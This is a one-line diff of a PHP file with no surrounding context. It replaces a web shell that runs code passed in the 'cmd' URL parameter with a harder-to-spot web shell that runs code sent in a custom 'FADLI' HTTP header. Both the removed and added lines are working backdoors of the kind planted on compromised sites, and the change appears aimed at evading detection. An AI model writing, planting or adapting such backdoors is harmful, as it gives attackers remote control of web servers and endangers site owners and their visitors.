@@ -1,1 +1,1 @@
-<?php assert($_GET['cmd']); ?>
+<?=assert($_SERVER['HTTP_FADLI']); ?>
